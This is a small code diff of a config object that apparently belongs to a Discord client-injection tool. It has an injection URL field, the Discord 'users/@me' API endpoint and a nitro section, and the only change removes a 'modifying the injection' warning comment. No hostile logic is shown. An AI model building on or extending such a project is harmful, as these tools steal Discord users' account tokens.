@@ -16,7 +16,7 @@ const config = {
   embed_color: 8363488,
   injection_url: '',
   /**
-   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
+
    **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
